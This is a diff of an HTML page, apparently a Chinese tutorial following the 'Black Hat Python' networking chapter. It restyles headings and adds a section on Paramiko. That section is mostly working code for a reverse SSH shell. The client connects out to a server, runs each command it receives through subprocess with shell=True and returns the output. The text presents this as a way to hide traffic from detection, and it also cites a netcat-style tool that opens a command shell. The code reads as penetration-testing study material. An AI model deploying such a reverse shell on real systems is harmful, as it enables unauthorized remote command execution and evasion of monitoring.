@@ -44,8 +44,8 @@
                 <h4>第一章：网络编程</h4>
                 <div class="col-md-2" style="background-color:#4d4d4d"></div>
                 <div class="col-md-8">
-                    <p>在渗透测试中，经常会遇到需要创建一个TCP客户端连接服务、发送垃圾数据、进行模糊测试或者进行其他任务的情况。</p>
-                    <p>创建一个TCP客户端</p>
+                    <p class="text-info lead">创建一个TCP客户端</p>
+                    <p>在渗透测试中，经常会遇到需要创建一个TCP客户端连接服务、发送垃圾数据、进行模糊测试或者进行其他任务的情况。能够迅速的手动创建一个简单的TCP客户端显的至关重要。</p>
                     <pre>import socket
 target_host = 'www.baidu.com'
 target_port = 80
@@ -62,7 +62,7 @@ client.send("GET / HTTP/1.1\r\nHost: baidu.com\r\n\r\n")
 #接受一些数据
 response = client.recv(4096)
 print response</pre>
-                    <p>创建一个UDP客户端</p>
+                    <p class="text-info lead">创建一个UDP客户端</p>
                     <pre>import socket
 target_host = "127.0.0.1"
 target_port = 80
@@ -72,7 +72,7 @@ client.sendto("AABBCCDD",(target_host,target_port))
 #接收数据
 data,addr = client.recvfrom(4096)
 print data</pre>
-                    <p>创建一个TCP服务端</p>
+                    <p class="text-info lead">创建一个TCP服务端</p>
                     <pre>import socket
 import threading
 
@@ -97,6 +97,7 @@ while True:
     client_handler = threading.Thread(target=handle_client,args=(client,))
     client_handler.start()#开始新的线程</pre>
 
+                    <p class="text-info lead">取代netcat</p>
                     <p>在遇到需要建立一个简单的客户端与服务端来传递数据时，或者建立一个监听端让自己有监听权限时可以利用python编辑一个小工具</p>
                     <pre>import sys
 import socket
@@ -272,8 +273,9 @@ def client_handler(client_socket):
 
                     <p>打开一个终端运行<code>python bhpnet.py -l -p 9999 -c</code>，这段命令为作为服务端监听所以主机在9999号端口的连接并且打开一个命令行shell。再打开另外一个终端运行<code>python bhpnet.py -t localhost -p 9999</code>,这段命令为作为客户端连接本地的9999号端口，在输入<code>CTRL-D</code>（为linux系统下，如是windows系统则为CTRL-Z）来结束从标准输入端的输入从而让客户端进入<code>client_sender()</code>函数，之后客户端便会显示&lt;BHP:#&gt;表示打开命令个shell，即可输入命令，命令将会送入服务端执行再将执行结果返回至客户端显示。</p>
 
-                    <p>建立一个TCP代理，在无法使用wireshark等软件时用来嗅探本地流量，或者了解未知协议。</p>
-                    <p>TCP代理的工作流程：假设有A，B两台主机。A与TCP代理之间交换数据，B与TCP代理交换数据的方式来替代A，B之间之间交换数据。</p>
+                    <p class="text-info lead">创建一个TCP代理</p>
+                    <p>在自己的工具箱中保留一个TCP代理有着许多的优点，它不仅可以将流量从一个主机转发给i另一个主机，而且可以评估基于网络的软件。在企业级环境下进行渗透测试时，你会经常遇到无法使用wireshark的情况，无法在windows系统上加载驱动嗅探本地流量，分段网络也阻拦你使用工具直接嗅探主机。这时有个TCP代理工具就大有帮助。</p>
+                    <p class="text-success">TCP代理的工作流程：假设有A，B两台主机。A与TCP代理之间交换数据，B与TCP代理交换数据的方式来替代A，B之间之间交换数据。</p>
 
 
 
@@ -408,7 +410,158 @@ def response_handler(buffer):
 main()</pre>
                     <p>下图为TCP代理嗅探到的真机与虚拟机之间的数据交替</p>
                     <img class="img-thumbnail" src="https://tsleon.github.io/img/pro.png">
-                    <p class="text-warning">在进行测试时需要在运行tcp代理的主机上运行一个客户端去连接tcp代理，且客户端的连接的host须为‘127.0.0.1’，否则无法与tcp代理建立连接。</p>
+                    <p class="text-warning">在进行测试时需要在运行tcp代理的主机上运行一个客户端去连接tcp代理，且客户端的连接的host须为‘127.0.0.1’，否则无法与tcp代理建立连接。</p><br>
+
+                    <p class="text-info lead">通过Paremiko是用SSH</p>
+                    <p>使用之前编写的取代netcat的工具接收和发送数据非常方便，但有的时候通过加密流量来避免检测是更明智的选择。最常用的办法便是使用Secure Shell(SSH)发送流量。但万一目标环境中没有SSH客户端怎么？（比如现实中99.81943%的Windows主机）这时python的第三方库Paramiko中的PyCrypto能够让你轻松的使用SSH2协议。</p>
+                    <p class="text-primary">首先在Windows上创建一个简单连接，来了解Paramiko的工作方式。（PS:请确保linux中ssh已经开启，利用sudo service ssh start 来开启）</p>
+                    <pre>import threading
+import paramiko
+import subprocess
+
+def ssh_command(ip,user,passwd,command):
+    client = paramiko.SSHClient()
+    #client.load_host_keys('/home/Leon/.ssh/known_hosts'）支持密钥认证
+
+    #设置自动添加和保存目标SSH服务器的SSH密钥
+    client.set_missing_host_key_policy(paramiko.AutoAddPolicy())
+
+    #与目标建立连接
+    client.connect(ip,username=user,password=passwd)
+
+    #打开连接
+    ssh_session = client.get_transport().open_session()
+    if ssh_session.active:
+
+        在linux下执行命令并回传结果
+        ssh_session.exec_command(command)
+        print ssh_session.recv(1024)
+
+    return
+
+ssh_command('192.168.231.128','Leon','leon','id')</pre>
+
+                    <p>上述代码将显示linux中执行id命令后返回的结果，现在修改脚本，使之能够多次传送数据，并从服务端接受命令。</p>
+                    <pre>import threading
+import paramiko
+import subprocess
+
+def ssh_command(ip,user,passwd,command):
+
+    #建立客户端
+    client = paramiko.SSHClient()
+
+    #允许连接未知的主机并且自动添加和保存目标SSH服务器的密钥
+    client.set_missing_host_key_policy(paramiko.AutoAddPolicy())
+
+    #client.connect(ip,username,password,hostkey='value')密钥认证
+    client.connect(ip,username=user,password=passwd)
+
+    #打开对话
+    ssh_session = client.get_transport().open_session()
+
+    if ssh_session.active:
+
+        #发送数据到服务端，并打印从服务端接收的数据确连接成功
+        ssh_session.send(command)
+        print ssh_session.recv(1024)
+
+        while True:
+
+            #从服务端接收命令
+            command = ssh_session.recv(1024)
+            try:
+                #在客户端执行服务端发送的命令并将执行结果发送到服务端
+                cmd_output = subprocess.check_output(command,stderr=subprocess.STDOUT,shell=True)
+                ssh_session.send(cmd_output)
+            except Exception,e:
+                ssh_session.send(str(e))
+
+        client.close()
+    return
+
+ssh_command('192.168.0.106','Leon','leon','ClientConnected')</pre>
+
+                    <p>上述客户端将不断的从服务端接收命令，在本地执行后将执行结果返回至服务端。接下来编写SSH的服务端，其中Paramiko示例文件的密钥在<a href="https://github.com/paramiko/paramiko/tree/master/demos">Github</a>上</p>
+
+
+                    <pre>import socket
+import paramiko
+import threading
+import sys
+
+#使用Paramiko示例文件的密钥
+host_key = paramiko.RSAKey(filename='test_rsa.key')
+
+#SSH管道用来配置认证模式
+class Server(paramiko.ServerInterface):
+    def __init__(self):
+        self.event = threading.Event()
+    def check_channel_request(self, kind, chanid):
+        if kind == 'session':
+            return paramiko.OPEN_SUCCEEDED
+        return paramiko.OPEN_FAILED_ADMINISTRATIVELY_PROHIBITED
+    def check_auth_password(self, username, password):
+        if (username == 'Leon') and (password == 'leon'):
+            return paramiko.AUTH_SUCCESSFUL
+        return paramiko.AUTH_FAILED
+
+server = sys.argv[1]
+ssh_port = int(sys.argv[2])
+
+try:
+    #建立套接字监听
+    sock = socket.socket(socket.AF_INET,socket.SOCK_STREAM)
+    sock.setsockopt(socket.SOL_SOCKET,socket.SO_REUSEADDR,1)
+    sock.bind((server,ssh_port))
+    sock.listen(100)
+    print '[+] Listing for connection ...'
+
+    client,addr = sock.accept()
+except Exception,e:
+    print '[-] Listen failed: ' + str(e)
+    sys.exit(1)
+print '[+] Got a connection!'
+
+try:
+    #使用SSH管道并且配置认证模式
+    bhSession = paramiko.Transport(client)
+    bhSession.add_server_key(host_key)
+    server = Server()
+    try:
+        bhSession.start_server(server=server)
+    except paramiko.SSHException,x:
+        print '[-] SSH negotiation failed.'
+
+    #等待客户端连接
+    chan = bhSession.accept(20)
+    print '[+] Authenticated!'
+    print chan.recv(1024)
+    chan.send('Welcome to bh_ssh')
+    while True:
+        try:
+
+            #从服务端输入命令，判断是否退出，送往客户端执行 并打印出客户端的执行结果
+            command = raw_input("Enter command: ").strip('\n')
+            if command != 'exit':
+                chan.send(command)
+                print chan.recv(1024) + '\n'
+            else:
+                chan.send('exit')
+                print 'exiting'
+                bhSession.close()
+                raise Exception('exit')
+        except KeyboardInterrupt:
+            bhSession.close()
+except Exception,e:
+    print '[-] Caught exception: ' + str(e)
+    try:
+        bhSession.close()
+    except:
+        pass
+    sys.exit(1)</pre>
+                    <p>服务端接收到连接后发送<code>Welcome to bh_ssh</code>至客户端并打印从客户端接收到的数据，之后从服务端输入<code>dir</code>命令发送至客户端，在客户端执行后，打印出客端的执行结果。</p>
+                    <img class="img-thumbnail" src="https://tsleon.github.io/img/srcm.png">
                 </div>
                 <div class="col-md-2" style="background-color:#4d4d4d"></div>
             </div>
